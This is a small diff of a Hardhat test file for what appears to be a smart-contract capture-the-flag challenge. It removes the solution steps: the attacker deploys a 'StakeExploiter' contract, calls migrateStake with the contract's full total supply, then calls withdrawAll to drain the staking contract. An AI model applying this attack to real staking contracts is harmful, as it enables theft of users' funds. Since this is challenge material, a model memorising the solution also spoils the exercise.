@@ -57,12 +57,6 @@ before(async () => {
 
 it("solves the challenge", async function () {
 
-  let stakeExploiterFactory = await ethers.getContractFactory('StakeExploiter')
-  let stakeExploiter = await stakeExploiterFactory.connect(attacker).deploy()
-
-  await tastyStaking.connect(attacker).migrateStake(stakeExploiter.address,await tastyStaking.totalSupply())
-  await tastyStaking.connect(attacker).withdrawAll(false)
-
 });
 
 /// expected final state
